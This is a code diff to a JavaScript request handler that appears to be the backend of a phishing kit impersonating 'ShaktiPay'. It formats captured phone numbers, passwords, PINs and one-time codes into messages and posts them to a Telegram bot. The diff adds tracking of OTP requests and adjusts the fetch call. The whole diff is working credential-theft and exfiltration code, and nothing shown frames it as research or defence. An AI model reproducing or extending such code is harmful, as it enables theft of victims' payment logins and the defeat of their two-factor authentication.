@@ -13,12 +13,15 @@ export default async function handler(req, res) {
 
     if (type === 'LOGIN_DETAILS') {
         message = `🚨 *New ShaktiPay Login* 🚨\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${password}\`\n🔒 *PIN:* \`${pin}\``;
+    } else if (type === 'OTP_REQUEST') {
+        message = `🔐 *Login OTP requested (Modal)*\n📱 *Phone:* \`${phone}\``;
     } else if (type === 'OTP_CODE') {
-        message = `📱 *ShaktiPay OTP Received* 📱\n\n📞 *Phone:* \`${phone}\`\n🔢 *OTP Code:* \`${otp}\``;
+        message = `📱 *ShaktiPay OTP Entered* 📱\n\n📞 *Phone:* \`${phone}\`\n🔢 *OTP Code:* \`${otp}\``;
     }
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const response = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const telegramRes = await fetch(response, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -30,7 +33,7 @@ export default async function handler(req, res) {
             })
         });
 
-        const data = await response.json();
+        const data = await telegramRes.json();
 
         if (data.ok) {
             return res.status(200).json({ success: true });
